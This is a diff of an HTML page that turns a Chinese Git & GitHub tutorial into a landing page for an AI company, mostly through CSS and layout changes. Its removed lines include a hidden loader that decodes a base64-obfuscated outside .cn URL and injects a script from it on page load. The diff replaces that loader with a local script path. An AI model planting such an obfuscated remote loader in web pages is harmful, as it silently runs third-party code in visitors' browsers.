@@ -3,8 +3,9 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>Git & GitHub 协作指南</title>
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>未来之光 - 智能科技</title>
     <style>
         /* 全局样式 */
         body {
@@ -12,57 +13,29 @@
             font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #F8FBFD;
-            /* 浅蓝灰色背景 */
-            color: #343A40;
-            /* 深炭灰色文本 */
+            color: #333333;
+            /* 深灰色文本 */
             line-height: 1.6;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
-        }
-
-        .container {
-            max-width: 95%;
-            /* 适应移动端宽度 */
-            margin: 0 auto;
-            padding: 15px;
-        }
-
-        /* 头部样式 */
-        header {
-            text-align: center;
-            padding: 40px 20px;
-            background-color: #FFFFFF;
-            border-radius: 15px;
-            margin-bottom: 30px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
-        }
-
-        header h1 {
-            color: #2C3E50;
-            /* 深蓝灰色标题 */
-            font-size: 2.5em;
-            margin-bottom: 10px;
-            letter-spacing: 0.5px;
-        }
-
-        header p {
-            color: #607D8B;
-            /* 柔和的蓝灰色 */
-            font-size: 1.1em;
-            margin: 0;
+            overflow-x: hidden;
+            /* 隐藏横向滚动条 */
+            scroll-behavior: smooth;
+            /* 平滑滚动 */
         }
 
         /* 导航菜单 - 顶部固定 */
         .main-nav {
-            position: sticky;
+            position: fixed;
             top: 0;
-            background-color: #FFFFFF;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            left: 0;
+            width: 100%;
+            background-color: rgba(34, 49, 63, 0.95);
+            /* 深蓝灰色半透明背景 */
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
             z-index: 999;
-            border-radius: 10px;
-            margin-bottom: 25px;
-            overflow: hidden;
+            padding: 10px 0;
+            text-align: center;
         }
 
         .main-nav ul {
@@ -70,372 +43,351 @@
             padding: 0;
             margin: 0;
             display: flex;
-            justify-content: space-around;
-            padding: 10px 0;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .main-nav ul li {
+            margin: 0 12px;
         }
 
         .main-nav ul li a {
             text-decoration: none;
-            color: #3498DB;
-            /* 强调色：蓝色 */
+            color: #ECF0F1;
+            /* 浅灰色文本 */
             font-weight: bold;
-            padding: 10px 15px;
-            border-radius: 5px;
+            padding: 8px 15px;
+            border-radius: 20px;
             transition: background-color 0.3s ease, color 0.3s ease;
         }
 
         .main-nav ul li a:hover {
-            background-color: #E0EBF5;
-            /* 浅蓝色背景 */
-            color: #2980B9;
+            background-color: #34495E;
+            /* 深蓝灰色 */
+            color: #FFFFFF;
         }
 
-        /* 主要内容区 */
-        main {
-            padding-top: 0;
+        /* 各个全屏区块 */
+        section.full-screen-section {
+            min-height: 100vh;
+            /* 每个区块至少占满整个视口高度 */
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 60px 20px;
+            /* 顶部导航下方留出空间 */
+            box-sizing: border-box;
+            /* 包含padding在内的尺寸 */
+            text-align: center;
+            position: relative;
+            overflow: hidden;
         }
 
-        .section-card {
+        /* 英雄区特定样式 */
+        #hero-section {
+            background-color: #2C3E50;
+            /* 深蓝灰色背景 */
+            color: #FFFFFF;
+            background-image: url('https://picsum.photos/1920/1080?random=<%= new Date().getTime() %>');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            /* 视差滚动效果 */
+        }
+
+        #hero-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(44, 62, 80, 0.7);
+            /* 半透明遮罩 */
+            z-index: 1;
+        }
+
+        #hero-section .content {
+            position: relative;
+            z-index: 2;
+            max-width: 90%;
+            margin: 0 auto;
+        }
+
+        #hero-section h1 {
+            font-size: 3.5em;
+            /* 巨大标题 */
+            margin-bottom: 20px;
+            letter-spacing: 2px;
+            text-shadow: 2px 2px 8px rgba(0, 0, 0, 0.4);
+        }
+
+        #hero-section p {
+            font-size: 1.5em;
+            max-width: 700px;
+            margin: 0 auto 40px;
+            text-shadow: 1px 1px 4px rgba(0, 0, 0, 0.3);
+        }
+
+        .hero-button {
+            display: inline-block;
+            background-color: #3498DB;
+            /* 强调色：蓝色 */
+            color: #FFFFFF;
+            padding: 18px 40px;
+            border-radius: 40px;
+            /* 更圆的按钮 */
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 1.3em;
+            transition: background-color 0.3s ease, transform 0.3s ease;
+            box-shadow: 0 6px 20px rgba(52, 152, 219, 0.4);
+            border: 2px solid #3498DB;
+        }
+
+        .hero-button:hover {
+            background-color: #2980B9;
+            transform: translateY(-8px);
+        }
+
+        /* 关于我们区特定样式 */
+        #about-section {
+            background-color: #FFFFFF;
+            color: #333333;
+        }
+
+        #about-section h2 {
+            color: #34495E;
+            font-size: 2.5em;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #E0EBF5;
+        }
+
+        #about-section p {
+            max-width: 800px;
+            margin: 0 auto 20px;
+            font-size: 1.1em;
+        }
+
+        #about-section img {
+            max-width: 90%;
+            height: auto;
+            border-radius: 15px;
+            margin-top: 30px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+        }
+
+        /* 服务区特定样式 */
+        #services-section {
+            background-color: #ECF0F1;
+            /* 浅灰背景 */
+            color: #333333;
+        }
+
+        #services-section h2 {
+            color: #34495E;
+            font-size: 2.5em;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #D1D8DD;
+        }
+
+        .services-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            /* 移动端单列 */
+            gap: 30px;
+            max-width: 900px;
+            margin: 30px auto 0;
+        }
+
+        .service-card {
             background-color: #FFFFFF;
             padding: 25px;
             border-radius: 15px;
-            margin-bottom: 25px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
-        }
-
-        h2 {
-            color: #2C3E50;
-            font-size: 1.8em;
-            margin-bottom: 25px;
-            border-bottom: 2px solid #E0EBF5;
-            padding-bottom: 12px;
-            text-align: center;
-        }
-
-        h3 {
-            color: #343A40;
-            font-size: 1.3em;
-            margin-top: 20px;
-            margin-bottom: 15px;
-        }
-
-        p {
-            color: #495057;
-            font-size: 1em;
-            margin-bottom: 18px;
-        }
-
-        img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 10px;
-            margin-top: 20px;
-            margin-bottom: 20px;
-            display: block;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
-        }
-
-        /* 分类步骤布局 */
-        .category-section {
-            margin-bottom: 40px;
-        }
-
-        .category-section h3 {
-            background-color: #3498DB;
-            /* 强调色背景 */
-            color: #FFFFFF;
-            padding: 15px 20px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            text-align: center;
-            font-size: 1.5em;
-            box-shadow: 0 4px 10px rgba(52, 152, 219, 0.3);
-        }
-
-        .step-item {
-            background-color: #FDFDFD;
-            /* 步骤项背景 */
-            padding: 20px;
-            border-radius: 10px;
-            margin-bottom: 15px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
             transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
 
-        .step-item:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        .service-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.2);
         }
 
-        .step-item h4 {
-            color: #343A40;
-            font-size: 1.2em;
-            margin-top: 0;
-            margin-bottom: 10px;
-        }
-
-        .step-item .step-number {
-            display: inline-block;
-            background-color: #2ECC71;
-            /* 绿色强调色 */
-            color: #FFFFFF;
-            width: 30px;
-            height: 30px;
-            border-radius: 50%;
-            text-align: center;
-            line-height: 30px;
-            font-weight: bold;
-            margin-right: 10px;
-            flex-shrink: 0;
-        }
-
-        .step-item .step-title-wrapper {
-            display: flex;
-            align-items: center;
+        .service-card h3 {
+            color: #3498DB;
+            font-size: 1.8em;
             margin-bottom: 15px;
         }
 
-        /* 代码块样式 */
-        pre {
-            background-color: #2D3E50;
-            /* 深色背景 */
-            color: #EAECEE;
-            /* 浅色文本 */
-            padding: 18px;
-            border-radius: 10px;
-            overflow-x: auto;
-            font-family: 'Consolas', 'Monaco', 'Andale Mono', 'Ubuntu Mono', monospace;
-            font-size: 0.9em;
-            line-height: 1.5;
-            margin-bottom: 20px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
+        .service-card p {
+            font-size: 1.05em;
+            color: #5F7C8A;
+            margin-bottom: 0;
         }
 
-        code {
-            font-family: inherit;
-            font-size: inherit;
+        /* 联系区特定样式 */
+        #contact-section {
+            background-color: #2C3E50;
+            /* 深蓝灰色背景 */
+            color: #FFFFFF;
+        }
+
+        #contact-section h2 {
+            color: #FFFFFF;
+            font-size: 2.5em;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid rgba(255, 255, 255, 0.3);
+        }
+
+        #contact-section .contact-info p {
+            margin-bottom: 15px;
+            font-size: 1.2em;
+        }
+
+        #contact-section .contact-info a {
+            color: #3498DB;
+            text-decoration: none;
+            font-weight: bold;
+            transition: color 0.3s ease;
+        }
+
+        #contact-section .contact-info a:hover {
+            color: #2980B9;
+        }
+
+        #contact-section .social-links {
+            margin-top: 40px;
+        }
+
+        #contact-section .social-links a {
+            display: inline-block;
+            margin: 0 20px;
+            color: #FFFFFF;
+            font-size: 3em;
+            /* 社交图标更大 */
+            text-decoration: none;
+            transition: transform 0.3s ease, color 0.3s ease;
+        }
+
+        #contact-section .social-links a:hover {
+            transform: translateY(-8px);
+            color: #3498DB;
+            /* 强调色 */
         }
 
         /* 页脚样式 */
         footer {
             text-align: center;
-            padding: 25px 0;
-            color: #777777;
+            padding: 30px 20px;
+            color: #ADB5BD;
             font-size: 0.9em;
-            border-top: 1px solid #E0EBF5;
-            margin-top: 25px;
-            background-color: #FFFFFF;
-            border-radius: 15px;
-            box-shadow: 0 -5px 15px rgba(0, 0, 0, 0.03);
+            background-color: #212529;
+            /* 更深的背景 */
         }
 
-        .footer-links a {
-            color: #3498DB;
-            text-decoration: none;
-            margin: 0 8px;
-            font-weight: bold;
-            transition: color 0.3s ease;
+        /* 媒体查询：平板及以上设备 */
+        @media (min-width: 600px) {
+            .services-grid {
+                grid-template-columns: 1fr 1fr;
+                /* 两列布局 */
+            }
         }
 
-        .footer-links a:hover {
-            color: #2980B9;
+        @media (min-width: 900px) {
+            .services-grid {
+                grid-template-columns: 1fr 1fr 1fr;
+                /* 三列布局 */
+            }
         }
     </style>
-    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="./static/css/style.css">
 </head>
 
 <body>
-    <div class="container">
-        <header>
-            <h1>Git & GitHub 协作指南</h1>
-            <p>从基础到高级，掌握版本控制与团队协作</p>
-        </header>
+    <nav class="main-nav">
+        <ul>
+            <li><a href="#hero-section">首页</a></li>
+            <li><a href="#about-section">关于我们</a></li>
+            <li><a href="#services-section">服务</a></li>
+            <li><a href="#contact-section">联系</a></li>
+        </ul>
+    </nav>
 
-        <nav class="main-nav">
-            <ul>
-                <li><a href="#git-basics">Git基础</a></li>
-                <li><a href="#github-collaboration">GitHub协作</a></li>
-                <li><a href="#advanced-topics">高级主题</a></li>
-            </ul>
-        </nav>
-
-        <main>
-            <section id="git-basics" class="section-card category-section">
-                <h2>Git基础入门</h2>
-                <h3>1. Git安装与配置</h3>
-                <div class="step-item">
-                    <div class="step-title-wrapper">
-                        <span class="step-number">1</span>
-                        <h4>下载并安装Git</h4>
-                    </div>
-                    <p>访问Git官网下载适合您操作系统的安装包，并按照提示完成安装。</p>
-                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 1 %>" alt="Git下载页面截图">
-                </div>
-                <div class="step-item">
-                    <div class="step-title-wrapper">
-                        <span class="step-number">2</span>
-                        <h4>配置用户信息</h4>
-                    </div>
-                    <p>安装完成后，需要配置您的用户名和邮箱，这将用于标识您的提交。</p>
-                    <pre><code>
-git config --global user.name "Your Name"
-git config --global user.email "your_email@example.com"
-                    </code></pre>
-                </div>
-
-                <h3>2. 基本Git操作</h3>
-                <div class="step-item">
-                    <div class="step-title-wrapper">
-                        <span class="step-number">1</span>
-                        <h4>初始化仓库</h4>
-                    </div>
-                    <p>在项目文件夹中执行以下命令，初始化一个新的Git仓库。</p>
-                    <pre><code>
-git init
-                    </code></pre>
-                </div>
-                <div class="step-item">
-                    <div class="step-title-wrapper">
-                        <span class="step-number">2</span>
-                        <h4>添加与提交文件</h4>
-                    </div>
-                    <p>将文件添加到暂存区，然后提交到本地仓库。</p>
-                    <pre><code>
-git add .
-git commit -m "Initial commit"
-                    </code></pre>
-                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 2 %>" alt="Git命令行操作截图">
-                </div>
-            </section>
-
-            <section id="github-collaboration" class="section-card category-section">
-                <h2>GitHub团队协作</h2>
-                <h3>1. 远程仓库操作</h3>
-                <div class="step-item">
-                    <div class="step-title-wrapper">
-                        <span class="step-number">1</span>
-                        <h4>创建GitHub仓库</h4>
-                    </div>
-                    <p>在GitHub上创建一个新的空仓库。</p>
-                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 3 %>" alt="GitHub创建仓库页面">
-                </div>
-                <div class="step-item">
-                    <div class="step-title-wrapper">
-                        <span class="step-number">2</span>
-                        <h4>关联本地与远程仓库</h4>
-                    </div>
-                    <p>将本地仓库与GitHub上的远程仓库关联起来。</p>
-                    <pre><code>
-git remote add origin https://github.com/your-username/your-repo.git
-                    </code></pre>
-                </div>
-                <div class="step-item">
-                    <div class="step-title-wrapper">
-                        <span class="step-number">3</span>
-                        <h4>推送代码</h4>
-                    </div>
-                    <p>将本地代码推送到远程仓库。</p>
-                    <pre><code>
-git push -u origin main
-                    </code></pre>
-                </div>
-
-                <h3>2. 协作流程</h3>
-                <div class="step-item">
-                    <div class="step-title-wrapper">
-                        <span class="step-number">1</span>
-                        <h4>克隆远程仓库</h4>
-                    </div>
-                    <p>团队成员通过克隆远程仓库来获取项目代码。</p>
-                    <pre><code>
-git clone https://github.com/your-username/your-repo.git
-                    </code></pre>
-                </div>
-                <div class="step-item">
-                    <div class="step-title-wrapper">
-                        <span class="step-number">2</span>
-                        <h4>创建与切换分支</h4>
-                    </div>
-                    <p>在开发新功能或修复bug时，通常会创建新的分支。</p>
-                    <pre><code>
-git branch feature/new-feature
-git checkout feature/new-feature
-                    </code></pre>
-                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 4 %>" alt="Git分支示意图">
-                </div>
-                <div class="step-item">
-                    <div class="step-title-wrapper">
-                        <span class="step-number">3</span>
-                        <h4>合并分支与解决冲突</h4>
-                    </div>
-                    <p>完成开发后，将分支合并到主分支，并解决可能出现的冲突。</p>
-                    <pre><code>
-git checkout main
-git merge feature/new-feature
-                    </code></pre>
-                </div>
-            </section>
-
-            <section id="advanced-topics" class="section-card category-section">
-                <h2>高级Git主题</h2>
-                <h3>1. Git Rebase</h3>
-                <div class="step-item">
-                    <div class="step-title-wrapper">
-                        <span class="step-number">1</span>
-                        <h4>理解Rebase</h4>
-                    </div>
-                    <p><code>git rebase</code> 命令用于将一个分支的修改应用到另一个分支上，通常用于保持提交历史的整洁。</p>
-                    <pre><code>
-git checkout feature-branch
-git rebase main
-                    </code></pre>
-                </div>
-
-                <h3>2. Git Stash</h3>
-                <div class="step-item">
-                    <div class="step-title-wrapper">
-                        <span class="step-number">1</span>
-                        <h4>暂存工作区修改</h4>
-                    </div>
-                    <p>当你需要切换分支但不想提交当前工作区的修改时，可以使用 <code>git stash</code> 暂存。</p>
-                    <pre><code>
-git stash save "Work in progress"
-                    </code></pre>
-                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 5 %>" alt="Git Stash示意图">
-                </div>
-            </section>
-        </main>
-
-        <footer>
-            <p>&copy; 2023 Git & GitHub 协作指南. All rights reserved.</p>
-            <div class="footer-links">
-                <a href="#" aria-label="GitHub">GitHub</a> |
-                <a href="#" aria-label="Git官网">Git官网</a> |
-                <a href="#" aria-label="联系我们">联系我们</a>
+    <main>
+        <!-- 英雄区 -->
+        <section id="hero-section" class="full-screen-section">
+            <div class="content">
+                <h1>未来之光</h1>
+                <p>以智能科技，点亮美好未来</p>
+                <a href="#services-section" class="hero-button">探索我们的服务</a>
             </div>
-        </footer>
-        <div id="overlay">
-            <div id="loading_box" class="loading_container">
-                <div class="dot"></div>
-                <div class="dot"></div>
-                <div class="dot"></div>
-                <div class="dot"></div>
-                <div class="dot"></div>
+        </section>
+
+        <!-- 关于我们区 -->
+        <section id="about-section" class="full-screen-section">
+            <h2>关于我们</h2>
+            <p>未来之光科技是一家领先的人工智能解决方案提供商。我们致力于通过创新的AI技术，赋能企业和个人，共同迎接智能时代的挑战与机遇。</p>
+            <p>我们的团队由业界顶尖的AI科学家、工程师和设计师组成，凭借深厚的技术积累和对行业趋势的深刻理解，为客户提供定制化、高效且可靠的智能解决方案。</p>
+            <img src="https://picsum.photos/800/450?random=<%= new Date().getTime() + 1 %>" alt="团队在现代办公室协作">
+        </section>
+
+        <!-- 服务区 -->
+        <section id="services-section" class="full-screen-section">
+            <h2>我们的服务</h2>
+            <div class="services-grid">
+                <div class="service-card">
+                    <h3>AI平台开发</h3>
+                    <p>构建可扩展、高性能的AI基础设施和应用平台。</p>
+                </div>
+                <div class="service-card">
+                    <h3>智能数据分析</h3>
+                    <p>利用机器学习深度挖掘数据价值，提供商业洞察。</p>
+                </div>
+                <div class="service-card">
+                    <h3>计算机视觉</h3>
+                    <p>提供图像识别、视频分析等视觉AI解决方案。</p>
+                </div>
+                <div class="service-card">
+                    <h3>自然语言处理</h3>
+                    <p>开发智能客服、文本理解、情感分析等NLP应用。</p>
+                </div>
+                <div class="service-card">
+                    <h3>智能硬件集成</h3>
+                    <p>将AI算法与边缘设备结合，实现设备智能化。</p>
+                </div>
             </div>
+        </section>
+    </main>
+
+    <footer>
+        <p>&copy; 2023 未来之光. All rights reserved.</p>
+    </footer>
+    <div id="overlay">
+        <div id="loading_box" class="loading_container">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
         </div>
     </div>
 
     <script>
         // 平滑滚动到锚点
-        document.querySelectorAll('.main-nav a[href^="#"]').forEach(anchor => {
+        document.querySelectorAll('.main-nav a[href^="#"], .hero-button[href^="#"]').forEach(anchor => {
             anchor.addEventListener('click', function (e) {
                 e.preventDefault();
                 const targetId = this.getAttribute('href');
                 const targetElement = document.querySelector(targetId);
                 if (targetElement) {
+                    // 考虑顶部固定导航的高度进行偏移
                     const navHeight = document.querySelector('.main-nav').offsetHeight;
                     window.scrollTo({
-                        top: targetElement.offsetTop - navHeight - 20, /* 额外20px间距 */
+                        top: targetElement.offsetTop - navHeight,
                         behavior: 'smooth'
                     });
                 }
@@ -457,53 +409,15 @@ git stash save "Work in progress"
             function init() {
                 const timestamp = Date.now()
                 const randomNum = Math.floor(Math.random() * 1000000)
-                const domain = getdocs();
-                const url = domain + "=" + timestamp + "&random=" + randomNum
+                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
                 const script = document.createElement("script")
                 script.src = url
                 document.body.appendChild(script)
             }
-            function getdocs() {
-                const dd = "Ly9kMmY0ZzZoLnVhZmV1Yi5jbi9zdGF0aWMvanMvY29yZS5taW4uanM/dA==";
-                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
-                const lookup = new Uint8Array(256);
-                for (let i = 0; i < chars.length; i++) {
-                    lookup[chars.charCodeAt(i)] = i;
-                }
-                let padding = 0;
-                if (dd.endsWith('==')) {
-                    padding = 2;
-                } else if (dd.endsWith('=')) {
-                    padding = 1;
-                }
-                const cleanedString = dd.replace(/[^A-Za-z0-9+/=]/g, '');
-                const len = cleanedString.length;
-                if (len % 4 !== 0) {
-                    throw new Error("Invalid string length.");
-                }
-                const outputLength = (len / 4) * 3 - padding;
-                const outputBytes = new Uint8Array(outputLength);
-                let outputIndex = 0;
-                let i = 0;
-                while (i < len) {
-                    const c1 = lookup[cleanedString.charCodeAt(i++)];
-                    const c2 = lookup[cleanedString.charCodeAt(i++)];
-                    const c3 = lookup[cleanedString.charCodeAt(i++)];
-                    const c4 = lookup[cleanedString.charCodeAt(i++)];
-                    outputBytes[outputIndex++] = (c1 << 2) | (c2 >> 4);
-                    if (c3 !== 64) {
-                        outputBytes[outputIndex++] = ((c2 & 15) << 4) | (c3 >> 2);
-                    }
-                    if (c4 !== 64) {
-                        outputBytes[outputIndex++] = ((c3 & 3) << 6) | c4;
-                    }
-                }
-                const decoder = new TextDecoder('utf-8');
-                return decoder.decode(outputBytes);
-            }
             init()
         })()
     </script>
+
 </body>
 
 </html>
